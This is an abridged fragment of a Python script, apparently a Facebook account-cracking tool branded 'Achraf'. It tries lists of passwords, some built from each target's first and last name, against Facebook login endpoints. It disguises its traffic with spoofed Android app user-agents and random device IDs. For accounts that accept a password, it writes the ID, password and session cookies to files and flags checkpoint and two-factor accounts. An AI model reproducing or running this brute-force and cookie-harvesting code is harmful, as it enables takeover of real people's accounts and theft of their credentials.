...
def rd1(ids,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        ua  = "[FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/Orca-Android;FBAV/78.0.0.65.21;FBBV/666395;FBDM/{density=4.7,width=1080,height=1920};FBLC/es_PK;FBCR/H2O Wireless;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SGH-I337M;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]"
...
def api(ids,names,passlist):
        try:
                ...
                for pw in passlist:
                        ...
                        #oks.append(ids)
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [Achraf-OK] '+ids+'|'+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/Achraf-COKIE.txt','a').write(ids+'|'+pas+ '|' +coki+'\n')
                                        open('/sdcard/Achraf-OK.txt','a').write(ids+'|'+pas+'\n')
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[Achraf-2F] '+ids+'|'+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [Achraf-CP] '+ids+'|'+pas+'\033[1;97m')
...
def api2(ids,names,passlist):
        try:
                ...
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        ua  = "[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/366.1.0.20.113;FBBV/368908295;FBDM/{density=2.625,width=1080,height=2123};FBLC/en_Qaau_US;FBRV/370458609;FBCR/SGP-M1;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N986B;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]"
                        adid=str(uuid.uuid4())
                        device_id=str(uuid.uuid4()) 
                        ...
                        if 'session_key' in po:
                                        ...
                                        sys.stdout.write('\r\r\033[1;31m [Achraf-M2] %s|\033[1;31mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
...
def api3(ids,names,passlist):
        try:
                global ok,loop
                sys.stdout.write('\r\r\033[1;37m [Achraf-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
